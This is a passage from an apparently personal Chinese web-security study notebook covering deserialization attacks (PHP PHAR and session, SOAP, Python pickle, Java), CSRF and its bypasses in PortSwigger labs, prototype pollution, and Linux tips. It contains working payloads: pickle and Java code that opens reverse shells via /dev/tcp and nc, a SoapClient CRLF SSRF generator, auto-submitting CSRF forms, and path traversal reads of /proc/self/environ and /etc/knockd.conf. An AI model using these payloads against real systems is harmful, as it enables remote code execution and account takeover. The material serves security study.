              # 如果将序列化内容存储于此
              if file["loc"]:
                  # metadata长度
                  files += pack("I", len(file["metaData"]))
                  # metadata内容
                  files += file["metaData"]
              else:
                  files += pack("I", 0)
  
          return files
  
      def content(self):
  
          contents = b""
  
          # 遍历所有归档文件
          for file in self.filesData:
              contents += file["fileContent"]
  
          return contents
  
      def signature(self, content):
  
          signature = b""
  
          # 签名内容
          if self.signatureType == self.MD5:
              signature = md5(content).digest()
          if self.signatureType == self.SHA1:
              signature = sha1(content).digest()
          if self.signatureType == self.SHA256:
              signature = sha256(content).digest()
          if self.signatureType == self.SHA512:
              signature = sha512(content).digest()
          # 签名标志
          signature += self.signatureType
          # GBMB标志
          signature += self.GBMB
  
          return signature
  
  
  if __name__ == '__main__':
      pharData = {
          "prefix": "123",
          "manifestData": {
              "loc": True,
              "metaData": """O:1:"e":1:{s:1:"a";s:4:"text";}""",
          },
          "filesData": [
              {
                  "fileName": "e.txt",
                  "fileContent": "dsadawada",
                  "loc": True,
                  "metaData": """O:1:"e":1:{s:1:"a";s:4:"text";}""",
              },
              {
                  "fileName": "c.txt",
                  "fileContent": "123",
                  "loc": True,
                  "metaData": """O:1:"e":1:{s:1:"a";s:4:"text";}""",
              },
          ],
          "signatureType": PHAR.SHA1,
      }
      p = PHAR(**pharData).generate()
      with open("a.phar", "wb") as f:
          f.write(p)
  ```



### PHP session反序列化

PHP中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项 **session.save_handler** 来进行确定的，默认是以文件的方式存储。存储的文件是以sess_[sessionid]来进行命名的。

有三种方式：

- 默认使用php：键名|键值（经过序列化函数处理的值）

  `name|s:6:"1FonlY";`

- **php_serialize**：经过序列化函数处理的值

  `a:1:{s:4:"name";s:6:"1FonlY";}`

- **php_binary**：键名的长度对应的ASCII字符 + 键名 + 经过序列化函数处理的值

  `names:6:"1FonlY";`

  不可显的为`EOT` ,`name`的长度为`4` 4在ASCII 表中就是 EOT

**当序列化的引擎和反序列化的引擎不一致时(写入和读取session的格式不一样），就可以利用引擎之间的差异产生序列化注入漏洞。**

比如这里先实例化一个对象，然后将其序列化为 `O:7:"_1FonlY":1:{s:3:"cmd";N;}`，

如果传入 `|O:7:"_1FonlY":1:{s:3:"cmd";N;}`，在使用`php_serialize` 引擎的时候，

序列化后的session 文件是这样的 `a:1:{s:4:"name";s:31:"|O:7:"_1FonlY":1:{s:3:"cmd";N;}";}`，

这时，将`a:1:{s:4:"name";s:31:"` 当做键名，`O:7:"_1FonlY":1:{s:3:"cmd";N;}` 当做键值，将键值进行反序列化输出，这时就造成了序列化注入攻击。



### Soap反序列化

`SOAP` : `Simple Object Access Protocol`简单对象访问协议。

采用HTTP作为底层通讯协议，XML作为数据传送的格式，正常情况下的`SoapClient`类，调用一个不存在的函数，会去调用`__call`方法。

**CRLF漏洞**

`SOAPAction`处可控，可以把`\x0d\x0a`注入到`SOAPAction`，POST请求的header就可以被控制。

但`Content-Type`在`SOAPAction`的上面，就无法控制`Content-Type`，也就不能控制POST的数据。

在header里`User-Agent`在`Content-Type`前面，`user_agent`同样可以注入`CRLF`，控制`Content-Type`的值。

复制

```
<?php
$target = 'http://127.0.0.1:5555/path';
$post_string = 'data=something';
$headers = array(
    'X-Forwarded-For: 127.0.0.1',
    'Cookie: PHPSESSID=my_session'
    );
$b = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'=> "aaab"));

$aaa = serialize($b);
$aaa = str_replace('^^',"\r\n",$aaa);
//$aaa = str_replace('&','&',$aaa);
echo $aaa;
//echo urlencode($aaa);

//$c = unserialize($aaa);
//$c->not_exists_function();
?>
```

如上，使用SoapClient反序列化+CRLF**可以生成任意POST请求**。

**`Deserialization + __call + SoapClient + CRLF = SSRF`**



### python反序列化

与PHP类似，python也有序列化功能以长期储存内存中的数据。pickle是python下的序列化与反序列化包。

python有另一个更原始的序列化包marshal，现在开发时一般使用pickle。

与json相比，pickle以二进制储存，不易人工阅读；json可以跨语言，而pickle是Python专用的；pickle能表示python几乎所有的类型（包括自定义类型），json只能表示一部分内置类型且不能表示自定义类型。

pickle实际上可以看作一种**独立的语言**，通过对opcode的更改编写可以执行python代码、覆盖变量等操作。直接编写的opcode灵活性比使用pickle序列化生成的代码更高，有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）。

复制

```
# poc
import pickle
import base64
class A(object):
    def __reduce__(self):
        return (eval,("__import__('os').system('bash -c \"bash -i >& /dev/tcp/[IP]/[Port] 0>&1\"')",))
poc = A()
result = pickle.dumps(poc)
result = base64.b64encode(result)
print(result)
```

参考：

[Python-Pickle反序列化安全问题](https://www.f4de.ink/pages/20ac5e/#pickle：python的序列化库)

[pickle反序列化初探](https://xz.aliyun.com/t/7436)

[Code-Breaking中的两个Python沙箱](https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html)

[pickle反序列化—高校抗“疫”网络安全分享赛](https://www.cnblogs.com/DEADF1SH-CAT/p/12465346.html)

[从零开始python反序列化攻击：pickle原理解析 & 不用reduce的RCE姿势](https://zhuanlan.zhihu.com/p/89132768)



### Java反序列化

Java序列化是指把Java对象转换为字节序列的过程，`ObjectOutputStream` 类的 `writeObject()` 方法可以实现序列化。

Java反序列化是指把字节序列恢复为Java对象的过程，`ObjectOutputStream` 类的 `readObject()` 方法用于反序列化。

一个类要能反序列化必须满足下面2个条件：

1. 该类必须实现 `java.io.Serializable` 接口；
2. 该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。

复制

```
public class User implements Serializable {
    private String username;
    public User(String username) {
        this.username = username;
    }
    public String getName(){
        return this.username;
    }
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        Runtime.getRuntime().exec(this.username);
    }
}

package com.ctfshow.entity;

public class UserPayload {
    public static void main(String[] args) throws Exception {
        String userDataPost = null;
        User user = new User("nc IP Port -e /bin/sh");
        try {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream os = new ObjectOutputStream(byteArrayOutputStream);
            os.writeObject(user);
            os.close();
            byte[] userData = byteArrayOutputStream.toByteArray();
            userDataPost = new String(Base64.getEncoder().encode(userData));
            System.out.println(userDataPost);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        
    }
}
```

**绕过**

- readUnshared()

  readUnshared()不允许后续的readObject和readUnshared调用引用这次调用反序列化得到的对象，而readObject读取的对象可以。

### [Shiro反序列化](https://www.cnblogs.com/xiaozi/p/13239046.html)

[详情与利用](https://blog.csdn.net/m0_46363249/article/details/122259407?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167646752616800192251873%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=167646752616800192251873&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~pc_rank_34-18-122259407-null-null.142^v73^pc_new_rank,201^v4^add_ask,239^v1^insert_chatgpt&utm_term=shiro&spm=1018.2226.3001.4187)

漏洞原理

 Apache Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的cookie，在服务端接收cookie值后，Base64解码–>AES解密–>[反序列化](https://so.csdn.net/so/search?q=反序列化&spm=1001.2101.3001.7020)。攻击者只要找到AES加密的密钥，就可以构造一个恶意对象，对其进行序列化–>AES加密–>Base64编码，然后将其作为cookie的rememberMe字段发送，Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞。

**判断**：

- 未登陆的情况下，请求包的cookie中没有rememberMe字段，返回包set-Cookie里也没有deleteMe字段
- 登陆失败的话，不管勾选RememberMe字段没有，返回包都会有rememberMe=deleteMe字段
- 不勾选RememberMe字段，登陆成功的话，返回包set-Cookie会有rememberMe=deleteMe字段。但是之后的所有请求中Cookie都不会有rememberMe字段
- 勾选RememberMe字段，登陆成功的话，返回包set-Cookie会有rememberMe=deleteMe字段，还会有rememberMe字段，之后的所有请求中Cookie都会有rememberMe字段





### JDBC反序列化

[MySQL客户端jdbc反序列化漏洞](https://github.com/codeplutos/MySQL-JDBC-Deserialization-Payload)



### 框架反序列化（CVE）

- ##### Yii2

  [CVE-2020-15148 Yii2反序列化RCE POP链分析](https://xz.aliyun.com/t/8307)

  [我是如何挖掘yii2反序列化0day的](https://www.anquanke.com/post/id/217930)

- ##### Laravel

  - v5.8

    [Laravel 5.8 RCE 分析](https://www.bbsmax.com/A/ZOJPvDnldv/)

- ##### ThinkPHP

  - v5.1.x

    [ThinkPHP 5.1.x反序列化](https://nikoeurus.github.io/2019/12/31/ThinkPHP 5.1.x反序列化/)

### PHPGGC

PHPGGC是一款能够自动生成主流框架的序列化测试payload的工具。

[PHPGGC: PHP Generic Gadget Chains](https://github.com/ambionics/phpggc)

[从0到1掌握反序列化工具之PHPGGC](https://xz.aliyun.com/t/5450)



从0到1完全掌握CSRF

> 二刷漏洞：知其所以然 -> 知其然 -> 懂其攻 -> 知其守

## CSRF

总觉得自己的 CSRF 掌握的挺不好的，如今二刷一遍。

当初一刷的时候用的是 Port，而毕竟 Port 嘛，更加注重的是漏洞挖掘，所以当时只是简单地会用 Burpsuite 当中的 CSRF Poc 而已，其余的原理阿，防御措施阿，都不太懂。

### 0x02 什么是 CSRF

面试的时候的著名问题："谈一谈你对 CSRF 与 SSRF 区别的看法"

这个问题，如果我们用非常通俗的语言讲的话，CSRF 更像是钓鱼的举动，是用户攻击用户的；而对于 SSRF 来说，是由服务器发出请求，用户**日**服务器的。

CSRF（Cross-site request forgery）跨站请求伪造：攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。

在 Port 中，原理图是这样的

![image](https://image.3001.net/images/20220515/1652623649_6281092110273b376c131.png!small)

> 我们在学习 CSRF 攻击之前好好先阐述一下它的原理

一个典型的CSRF攻击有着如下的流程：

- 受害者登录 a.com，并保留了登录凭证（Cookie）。
- 攻击者引诱受害者访问了 b.com。
- b.com 向 a.com 发送了一个请求：a.com/act=xx。浏览器会默认携带 a.com 的 Cookie。
- a.com 接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。
- a.com 以受害者的名义执行了 act=xx。
- 攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让 a.com 执行了自己定义的操作。

是不是感觉这个工作流程和 XSS 有些类似，但是 XSS 与 CSRF 的最大区别在于对 Cookie 的使用，XSS 的把受害者 的 Cookie 偷盗过来，而 CSRF 则是借用了受害者的 Cookie。

下面我们举个例子深化一下 CSRF 的原理。

### 0x03 CSRF 实战场景(原理应用)

本段内容摘自[美团技术团队文章](https://tech.meituan.com/2018/10/11/fe-security-csrf.html)

这一天，小明同学百无聊赖地刷着 Gmail 邮件。大部分都是没营养的通知、验证码、聊天记录之类。但有一封邮件引起了小明的注意：

> 甩卖比特币，一个只要998！！

聪明的小明当然知道这种肯定是骗子，但还是抱着好奇的态度点了进去（请勿模仿）。果然，这只是一个什么都没有的空白页面，小明失望的关闭了页面。一切似乎什么都没有发生……

在这平静的外表之下，黑客的攻击已然得手。小明的 Gmail 中，被偷偷设置了一个过滤规则，这个规则使得所有的邮件都会被**自动转发**到 hacker@hackermail.com(也就是攻击方的邮箱)。小明还在继续刷着邮件，殊不知他的邮件正在一封封地，如脱缰的野马一般地，持续不断地向着黑客的邮箱转发而去。

不久之后的一天，小明发现自己的域名已经被转让了。懵懂的小明以为是域名到期自己忘了续费，直到有一天，对方开出了 $650 的赎回价码，小明才开始觉得不太对劲。

小明仔细查了下域名的转让，对方是拥有自己的验证码的，而域名的验证码只存在于自己的邮箱里面。小明回想起那天奇怪的链接，打开后重新查看了“空白页”的源码：

```
<form method="POST" 		action="https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf" enctype="multipart/form-data"> 
	<input type="hidden" name="cf2_emc" value="true"/> 
	<input type="hidden" name="cf2_email" value="hacker@hakermail.com"/> 
	..... 
	<input type="hidden" name="irf" value="on"/> 
	<input type="hidden" name="nvp_bu_cftb" value="Create Filter"/> 
</form> 

<script> document.forms[0].submit(); </script>
```

##### 代码解析 ———— 这也是我们后续要讲到的 CSRF Poc

这个页面只要打开，就会向Gmail发送一个post请求。请求中，执行了“Create Filter”命令，将所有的邮件，转发到“hacker@hackermail.com”。

小明由于刚刚就登陆了Gmail，所以这个请求发送时，携带着小明的登录凭证（Cookie），Gmail的后台接收到请求，验证了确实有小明的登录凭证，于是成功给小明配置了过滤器。

黑客可以查看小明的所有邮件，包括邮件里的域名验证码等隐私信息。拿到验证码之后，黑客就可以要求域名服务商把域名重置给自己。

这个页面只要打开，就会向Gmail发送一个post请求。请求中，执行了“Create Filter”命令，将所有的邮件，转发到“hacker@hackermail.com”。

小明由于刚刚就登陆了Gmail，所以这个请求发送时，携带着小明的登录凭证（Cookie），Gmail的后台接收到请求，验证了确实有小明的登录凭证，于是成功给小明配置了过滤器。

黑客可以查看小明的所有邮件，包括邮件里的域名验证码等隐私信息。拿到验证码之后，黑客就可以要求域名服务商把域名重置给自己。

### 0x04 CSRF 的攻击方式

上文中，我们明晰了一下 CSRF 的攻击原理，下面我们主讲漏洞挖掘。

### 1. GET 请求产生的 CSRF

GET 请求产生的 CSRF 较为简单，有 href 攻击的方式与 HTTP 请求的方式。

#### GET 请求的 href 类 CSRF

```
<a href="http://bank.com/transfer?account_number_from=123456789&account_number_to=987654321&amount=100000">View my Pictures!</a>
```

在已经登录了`bank.com`的情况下，当我们点击 "View my Pictures" 这一链接时，就会将钱从一个账户转移到另一个账户，数额为 100000

#### GET 请求的 HTTP 发包 CSRF

一般会这样利用：

```
![](url/withdraw?amount=10000&for=hacker)
 
```

在受害者访问含有这个img的页面后，浏览器会自动向
`http://bank.example/withdraw/account=xiaoming&amount=10000&for=hacker`发出一次 HTTP 请求。在攻击者接收到请求的时候我们便可以“借用”对方的 Cookie。

### 2. POST 请求产生的 CSRF

> POST 请求所产生的 CSRF 是我们利用地最多的攻击方式。

这种类型的 CSRF 利用起来通常使用的是一个自动提交的表单。

```
<form action="http://bank.example/withdraw" method=POST> 
	<input type="hidden" name="account" value="xiaoming" /> 
	<input type="hidden" name="amount" value="10000" /> 
	<input type="hidden" name="for" value="hacker" /> 
</form> 
<script> document.forms[0].submit(); </script>
```

访问该页面后，表单会自动提交，相当于模拟用户完成了一次 POST 操作。

POST 类型的攻击通常比 GET 要求更加严格一点，但仍并不复杂。任何个人网站、博客，被黑客上传页面的网站都有可能是发起攻击的来源，后端接口不能将安全寄托在仅允许 POST 上面。

这里可以通过 Burpsuite 自带的 CSRF Poc 工具进行攻击，不过在使用的时候也有一些小技巧。

#### 基础的 CSRF 攻击体验

对应可以尝试的靶场，在这靶场当中，并没有添加任意的 CSRF 防御

> 靶场地址 [Lab: CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)

因为 CSRF 本质上是一种钓鱼，所以我们也需要第三方网站攻击，如自己的服务器，或者 Burpsuite 靶场自带的 Exploit server；WebGoat 的 WebWolf。

我们先登录进靶场当中，发现有一功能点 ———— Update email

![image](https://image.3001.net/images/20220515/1652623677_6281093ddf6c659c807be.png!small)

试想一下，我们账号进行了 Update email 的操作。

若我们在自己的服务器上面挂上恶意的 Payload，诱导他人点击之后。相对应的，对方的邮箱也会变成我们 CSRF Poc 所指定的，这样子一来，我就可以通过 "忘记密码" 这种服务来获取他账户的权限了。(当然这里有个前提，对方是登录过的且 Cookie 处于生效期间)

**Exploit 部分**

用 Burpsuite 自带的 CSRF Poc 构造出基本框架；

![image](https://image.3001.net/images/20220515/1652623687_62810947088bb8af1e9bd.png!small)

然后我们把这个核心的表单拿出来，并加以修改，构造成最后的 POC

```
<form method="$method" action="$url"> 
	
	<input type="hidden" name="$param1name" value="$param1value"> 
</form> 
<script>
	document.forms[0].submit(); 
</script>
```

再放入到 Exploit Server 当中，点击 Deliver it to victim 即可。

在对方未对 CSRF 进行任何防御的时候，上述两种 CSRF 攻击方式能够通杀。

> 懂其攻 -> 知其守
>
> 我们现在已经知道 CSRF 攻击方式了，接下来着重讲一讲 CSRF 的防御手段以及绕过方式。

### 0x05 CSRF 的防御手段

主流的 CSRF 防御手段有以下两种

ban 掉不明域外访问 ———— 使用同源检测与 Samesite Cookie

多加一层验证手段 CSRF Token

### 1. 接近无敌的防御手法 CSRF Token

如果通俗易懂地解释一下 CSRF Token 的工作原理的话是这样的。

CSRF Token 每随着页面被操作，Token 都会改变，比如 f5 刷新，点击按钮等等，都会导致 CSRF Token 变化。

而每一个请求的 CSRF Token 会通过后端代码验证 Token 的有效性 ———— 是否正确，在时间戳上是否有效，如果加密字符串一致且时间未过期，那么这个Token就是有效的。

以 Java 为例，我们介绍一下 CSRF Token 服务端的校验逻辑

```
HttpServletRequest req = (HttpServletRequest)request; HttpSession s = req.getSession(); 
// 从 session 中得到 csrftoken 属性 
String sToken = (String)s.getAttribute(“csrftoken”); if(sToken == null) { 
	// 产生新的 token 放入 session 中 
	sToken = generateToken(); s.setAttribute(“csrftoken”,sToken); chain.doFilter(request, response); 
}
else { 
	// 从 HTTP 头中取得 csrftoken 
	String xhrToken = req.getHeader(“csrftoken”); 
	// 从请求参数中取得 csrftoken 
	String pToken = req.getParameter(“csrftoken”); 
	if(sToken != null && xhrToken != null && sToken.equals(xhrToken)){ 
		chain.doFilter(request, response); 
	}
	else if(sToken != null && pToken != null && sToken.equals(pToken)){ 
		chain.doFilter(request, response); 
	}
	else
	{ request.getRequestDispatcher(“error.jsp”).forward(request,response); 
	} 
}
```

### 2. 用的较少的限制同源

Samesite 是 Set-Cookie 的一种属性，它有三个值

`Strict`最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。换言之，只有当前网页的 URL 与请求目标一致，才会带上 Cookie。

```
Set-Cookie: CookieName=CookieValue; SameSite=Strict;
```

`Lax`规则稍稍放宽，大多数情况也是不发送第三方 Cookie，但是导航到目标网址的 Get 请求除外。

```
Set-Cookie: CookieName=CookieValue; SameSite=Lax;
```

还有一种属性为`None`，这种属性代表关闭了`SameSite`

> 一般攻击要进行绕过可以尝试将 SameSite 设置为 None

这种方法的原理也比较简单，因为 CSRF 的本质也是钓鱼，比如我通过邮箱发送钓鱼邮件，那么这时候的 "源" 就是邮箱界面。

如果服务器设置了严格的同源政策，将不接收来自邮箱这一 "源" 的请求。

**ok，讲完了常规的防御手段，接下来我们聊聊绕过**

------

### 0x06 针对 CSRF Token 与同源政策的绕过手段

> 我们的绕过手段是基于 CSRF Token 或同源政策并不是那么严格的情况下，甚至某些时候由于设计的疏忽产生的逻辑漏洞。

若非特别提醒，以下所有靶场的业务点均处于 **"Update email"**下。

### 1. 将 POST 修改为 GET 请求进行绕过

> 靶场地址 [Lab: CSRF where token validation depends on request method)](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method)

**背后逻辑**：

CSRF Token 在 POST 请求当中生效，且业务点并非完全限制请求为 POST 请求，从而给了攻击者进行绕过的机会。

探测方法：将 CSRF Token 删掉，并将 HTTP 请求修改为 GET 请求。

![image](https://image.3001.net/images/20220515/1652623705_628109597270d0f3b4daa.png!small)

此时的回显为`"Missing parameter 'csrf'"`，我们再将 HTTP 请求修改为 GET 请求，观察回显。

![image](https://image.3001.net/images/20220515/1652623715_62810963106b1d98b7f3d.png!small)

回显 302，代表我们可以用这种方式进行绕过，构造 Payload

![image](https://image.3001.net/images/20220515/1652623723_6281096b1eb5d5c9e1f9d.png!small)

### 2. 删除 CSRF Token 进行绕过

> 靶场地址 [Lab: CSRF where token validation depends on token being present](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-token-being-present)

**背后逻辑**:

并没有强验证 CSRF Token 的存在性。

我们尝试删除 CSRF Token，回显 302

![image](https://image.3001.net/images/20220515/1652623732_6281097426f5732a9897d.png!small)

在删除掉 CSRF Token 之后生成 POC 即可。

### 3. CSRF Token 未与用户 Session 绑定

> 靶场地址 [Lab: CSRF where token is not tied to user session](https://portswigger.net/web-security/csrf/lab-token-not-tied-to-user-session)

背后逻辑

未进行严格的一一身份对应，这其实很好理解。举个例子，我们登录注册界面，实际上是需要去匹配用户名与密码是否相等的，而这里的逻辑也是一致。

那么这里，我可以先修改 Cookie，再修改 CSRF Token，来观察 CSRF Token 与 Cookie 是否对应了，或者说是否绑定了。

修改 Cookie 中的 Session 值，观察回显为 "Unauthorized"

![image](https://image.3001.net/images/20220515/1652623767_62810997abce6290fb65a.png!small)

修改 CSRF Token，观察回显为 "Invalid CSRF Token"

说明 CSRF Token 并未与 session 绑定，而是与 csrfKey(也就是 value) 绑定的，根据 cookie 的传递性，我们可以在其他页面提前把 csrfKey 注入进去，这里我们利用`img`与`onerror`组合的 XSS 以及 CLRF 技术来构造 CSRF。

这里借用梨子师傅的 Poc

![image](https://image.3001.net/images/20220515/1652623773_6281099dd3a7bf5f4fc25.png!small)

当受害者点击 CSRF 链接时会先触发 CLRF 注入 Set-Cookie 参数值，将 csrfKey 值添加到 Cookie 中，然后再用附有与 csrfKey 对应的 CSRF Token 的请求去提交修改邮箱请求。

### 4. 当 Cookie 中的 CSRF 值与 CSRF Token 的值一致时

> 靶场地址 [Lab: CSRF where token is duplicated in cookie](https://portswigger.net/web-security/csrf/lab-token-duplicated-in-cookie)

背后逻辑：

只是将 CSRF Token 简单复制到 cookie 头中，然后仅验证两者是否一致。

所以这里我们的绕过 Poc 的核心部分应该是这样的,`%0d%0a`为`\r\n`，也就是 CR 与 LF

```
<img src="url/?search=test%0d%0aSet-Cookie:%20csrf=jVDOkLRjgEe41xJlURwUeAIcDet4Cier" onerror="document.forms[0].submit();"/>
```

![image](https://image.3001.net/images/20220515/1652623832_628109d8e9a0c5078f572.png!small)

### 5. 对不严格的 Referer 限制进行绕过

> 靶场地址 [Lab: CSRF with broken Referer validation](https://portswigger.net/web-security/csrf/lab-referer-validation-broken)

背后逻辑

并没有特别严格地限制 Referer，仅仅只是不允许了这一种的 Referer。

```
Referer: 靶场地址.com

// 下面是非法的

Referer: baidu.com
```

一般我们通过`Referer: baidu.com`来判断 Referer 的限制。

若`Referer: baidu.com`被限制，则我们可以通过这种方式进行绕过

```
http://attacker-website.com/csrf-attack?baidu.com
```

靶场部分，同样是对更改邮箱这个功能点进行 CSRF 攻击

这里我们需要介绍一下`history.pushState`，这个函数顾名思义，就是插入历史记录的，所以这也就是为什么第三个参数的值修改为与攻击链接同源后即可绕过错误地 Referer 头验证机制，所以我们这样构造 CSRF 页面。

我们先修改 Referer 为 baidu.com 查看回显，成功发包。

![image](https://image.3001.net/images/20220515/1652623842_628109e2826ef6ac24a7a.png!small)

修改 Referer 为`baidu.com+?laburl`，回显为 302 成功。

![image](https://image.3001.net/images/20220515/1652623851_628109eb2336fe9ed28cf.png!small)

构造 Payload，将`history.pushState`的第三个参数修改为 Lab 的 URL 地址。投放之后，在 Head 当中添加`Referrer-Policy: unsafe-url`

![image](https://image.3001.net/images/20220515/1652623860_628109f4138d2f3afc38f.png!small)

### 0x07 小结

CSRF 攻击本质上还是一种钓鱼手段，本文着重讲了一些 CSRF 攻击的绕过手法，说不定渗透的时候多试一试就能起到意想不到的效果。





## SSRF



## 6.文件上传漏洞[绕过](https://blog.csdn.net/qq_55213436/article/details/126091664)





## 7.javaScript原生型污染漏洞

[详细](https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x05-code-breaking-2018-thejs)

什么是原生型污染，首先我们都知道，JavaScript中我们都有类，object，比如说

```
function F(){
}
这也是一个类
当然通常是使用
class F(){
}
还有let a={}
这是一个object的类对象
```

关于对象（object） 与class的关系，也就是爹与儿子，一个实例化的对象来源于class,再比喻，把class当做是动物，然后动物就有一些特征，这些特征就是class里面的属性；然后实例化，就是小狗，小狗包含了一些属性；

然后回来，原生型是什么，就是指的是class 的原生态，比如上面的例子所举出来的，F，{} 就是原生型，而实例化出来的f= new F()   a={} 只是对象object



在类的原生型中，有一个默认的隐藏的属性，prototype，new出来的实例化对象有没有呢？有，实例化后的对象的这个属性是

```
__proto__

假如 f = new F()
那么就有
f.__proto__ = F.prototype
```

然后我们就可以通过修改f的proto来达到对F的更改，这就是原生型污染；



**如何利用这个漏洞**，

首先找到能够修改proto属性的函数，一般有 merged 还有

```
new=Object.assign({}, baseUser, user)
意思是，将user与baseUser进行合并到{}得到new;
```

一般这个漏洞存在于js后端，对传入的json数据进行json.parse的时候会触发污染

举例：

```js
let o1 = {}
let o2 = JSON.parse('{"a": 1, "__proto__": {"b": 2}}')
merge(o1, o2)
console.log(o1.a, o1.b)

o3 = {}
console.log(o3.b) //输出2
```









# 小知识点&技巧

## 1.Linux 用户配置文件信息/etc/passwd

  1）密码则在/etc/shadow，root 用户的UID和GID都为0，反过来可以根据这个成为root ，也就是说如果添加一个用户在/etc/passwd 里面的UID & GID都是0的话，那么它的**权限就是root，因此达到权限提升**；

2）shadow文件里面的密码是加盐hash存储的，什么是加盐？shadow内容的格式？[参考](https://blog.csdn.net/Drifter_Galaxy/article/details/124334401?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166635617516800184198016%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166635617516800184198016&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-124334401-null-null.142^v59^pc_rank_34_2,201^v3^control_1&utm_term=%2Fetc%2Fshadow%E5%AF%86%E7%A0%81%E8%A7%A3%E5%AF%86&spm=1018.2226.3001.4187)

明文密码是 **passwd**，**salt** 是随机字串

假设**id**=1，即选择**md5**哈希算法。

那么加盐的过程就是 计算 h a s h e d = m d 5 ( s a l t + p a s s w d ) hashed=md5(salt+passwd)hashed=md5(salt+passwd)

算出来之后就是咱们在shadow文件里读的 **$id$salt$hashed**了

## 2.端口状态为filtered  将其转为open

某些端口的状态是"filtered"，猜测是被防火墙过滤了

出现的问题及解决办法：

<img src="C:\Users\Treaveler\AppData\Roaming\Typora\typora-user-images\image-20221020204154228.png" alt="image-20221020204154228" style="zoom:50%;" />

<img src="C:\Users\Treaveler\AppData\Roaming\Typora\typora-user-images\image-20221020204328847.png" alt="image-20221020204328847" style="zoom:50%;" />

另外Linux上还有一种服务，knockd 可以隐藏端口，当nmap时端口状态可能就是filtered :

比如22端口可以通过knockd隐藏，查看`/etc/knockd.conf`里面的敲击端口，可以实现隐藏和打开端口；[参考](https://blog.csdn.net/shuteer_xu/article/details/113210793?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166626998916800182743771%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166626998916800182743771&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-113210793-null-null.142^v59^pc_rank_34_2,201^v3^control_1&utm_term=knockd%E9%9A%90%E8%97%8Fssh&spm=1018.2226.3001.4187)

配置解释如下：

``[options]`
`UseSyslog //用来定义日志输出位置以及文件名`

`[openSSH]`
`sequence = 7000,8000,9000 //设置（开门）敲门顺序，可以自定义`
`seq_timeout = 5 //设置超时时间`
`command = /sbin/iptables ‐A INPUT ‐s %IP% ‐p tcp ‐‐dport 22 ‐j ACCEPT //开门成功后添加防火墙规则命令（打开SSH端口）`
`tcpflags = syn`

`[closeSSH]`
`sequence = 9000,8000,7000 //设置（关门）敲门顺序，与开门顺序相反`
`seq_timeout = 5 //设置超时时间`
`command = /sbin/iptables ‐D INPUT ‐s %IP% ‐p tcp ‐‐dport 22 ‐j ACCEPT //关门成功后删除之前添加的防火墙规则（关闭SSH端口）`
`tcpflags = syn`

**渗透举例：DC-9：**

![image-20221020205537302](C:\Users\Treaveler\AppData\Roaming\Typora\typora-user-images\image-20221020205537302.png)

当使用九头蛇破解主机的ssh时，拒绝连接，nmap 发现22是filtered 状态。有可能就是采用了knockd的服务进行了隐藏，那么结合之前的文件包含漏洞，查看是否存在`/etc/knockd.conf`文件

访问 http://172.16.12.161/manage.php?file=../../../../etc/knockd.conf

![image-20221020210004819](C:\Users\Treaveler\AppData\Roaming\Typora\typora-user-images\image-20221020210004819.png)

看到敲击端口为7469 8475 9842

使用nc 172.16.12.161 7469 或者nmap -p 7469 172.16.12.161两种方式敲击端口，只要是与端口建立连接的命令都可以

依次敲击三个端口就可以开启ssh 状态为open

## 3.[/proc目录](https://blog.csdn.net/Zero_Adam/article/details/114853022)

我们都知道可以通过`/proc/$pid/`来获取指定进程的信息，例如内存映射、CPU绑定信息等等。如果某个进程想要获取本进程的系统信息，就可以通过进程的pid来访问/proc/$pid/目录。但是这个方法还需要获取进程pid，在fork、daemon等情况下pid还可能发生变化。为了更方便的获取本进程的信息，[linux](https://so.csdn.net/so/search?q=linux&spm=1001.2101.3001.7020)提供了`/proc/self/`目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于`/proc/本进程pid/`。进程可以通过访问`/proc/self/`目录来获取自己的系统信息，而不用每次都获取pid。



../../../../proc/self/cmdline  获取当前进程的运行过的命令，例如 python app.py，便可得到运行的文件为app.py

../../../../proc/self/environ   获取当前进程运行的环境；

../../../../proc/self/exe  获取可执行文件**的**完整路径**

**../../../../proc/self/fd**  获取**当前进程打开的每一个文件**的路径描述符，我们可以通过**fd**目录的文件获取进程，从而打开每个文件的路径以及文件内容。

例如**../../../../proc/self/fd**/1 便可打开进程1的文件内容，就算这个文件被删除，这里也有显示；

[CTF 例题](https://blog.csdn.net/Zero_Adam/article/details/114890384)

